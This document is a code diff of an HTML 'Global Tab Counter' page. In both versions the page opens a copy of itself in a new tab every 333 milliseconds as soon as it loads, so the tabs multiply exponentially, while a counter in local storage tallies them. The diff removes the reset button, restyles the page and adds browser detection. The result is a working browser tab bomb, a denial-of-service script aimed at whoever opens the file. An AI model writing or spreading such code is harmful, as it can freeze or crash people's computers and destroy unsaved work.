@@ -1,12 +1,12 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Tab Counter</title>
+    <title>Global Tab Counter</title>
     <style>
         body {
-            background: #000;
-            color: #00ff41; /* Classic Matrix/CMD green */
-            font-family: 'Courier New', monospace;
+            background: #0d0d0d;
+            color: #00e5ff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -15,71 +15,68 @@
             margin: 0;
             overflow: hidden;
         }
-        .counter-box {
-            border: 3px solid #00ff41;
-            padding: 40px;
+        .container {
+            border: 2px solid #00e5ff;
+            padding: 30px;
             text-align: center;
-            box-shadow: 0 0 20px #00ff41;
+            border-radius: 10px;
+            box-shadow: 0 0 15px #00e5ff;
         }
-        #count {
-            font-size: 80px;
-            font-weight: bold;
-            display: block;
-        }
-        .reset-btn {
-            margin-top: 20px;
-            background: transparent;
-            color: #00ff41;
-            border: 1px solid #00ff41;
-            cursor: pointer;
-            padding: 5px 10px;
-        }
+        #browser-id { color: #ff0055; font-weight: bold; }
+        #count { font-size: 100px; display: block; margin: 10px 0; }
     </style>
 </head>
 <body>
 
-    <div class="counter-box">
-        <h1>TABS SPAWNED</h1>
-        <span id="count">0</span>
-        <button class="reset-btn" onclick="resetCounter()">RESET COUNT</button>
+    <div class="container">
+        <h2>DETECTED BROWSER: <span id="browser-id">Detecting...</span></h2>
+        <div id="count">0</div>
+        <p>TOTAL TABS IN SESSION</p>
     </div>
 
     <script>
-        const countDisplay = document.getElementById('count');
-        const myPath = window.location.href;
+        const countElement = document.getElementById('count');
+        const browserElement = document.getElementById('browser-id');
 
-        // 1. On load, increment the total count in localStorage
-        function incrementCounter() {
-            let currentCount = parseInt(localStorage.getItem('tab_total')) || 0;
-            currentCount++;
-            localStorage.setItem('tab_total', currentCount);
-            updateDisplay();
+        // --- 1. Detect Browser Engine ---
+        function getBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.includes("Edg/")) return "Microsoft Edge";
+            if (ua.includes("OPR/") || ua.includes("Opera")) return "Opera";
+            if (ua.includes("Chrome")) return "Google Chrome";
+            return "Unknown Browser";
+        }
+        browserElement.innerText = getBrowser();
+
+        // --- 2. Reliable Counting Logic ---
+        function updateTabCount() {
+            // Get current value or start at 0
+            let total = parseInt(localStorage.getItem('global_tab_count')) || 0;
+            total++;
+            localStorage.setItem('global_tab_count', total);
+            
+            // Show the updated number
+            countElement.innerText = total;
         }
 
-        // 2. Update the number on the screen
-        function updateDisplay() {
-            const currentCount = localStorage.getItem('tab_total') || 0;
-            countDisplay.innerText = currentCount;
-        }
+        // --- 3. Sync across all tabs ---
+        window.addEventListener('storage', (event) => {
+            if (event.key === 'global_tab_count') {
+                countElement.innerText = event.newValue;
+            }
+        });
 
-        // 3. The spawning logic (3 per second)
+        // --- 4. The Spawner ---
         function spawn() {
-            window.open(myPath, '_blank');
+            window.open(window.location.href, '_blank');
         }
 
-        function resetCounter() {
-            localStorage.setItem('tab_total', 0);
-            updateDisplay();
-        }
-
-        // Initialize
-        incrementCounter();
-
-        // Listen for changes from other tabs so the counter updates live
-        window.addEventListener('storage', updateDisplay);
-
-        // Start spawning
-        setInterval(spawn, 333);
+        // Initialize and start the loop
+        updateTabCount();
+        
+        // This will only work if you have already clicked "Always allow popups"
+        // for this file in your browser's address bar!
+        setInterval(spawn, 333); 
     </script>
 </body>
 </html>
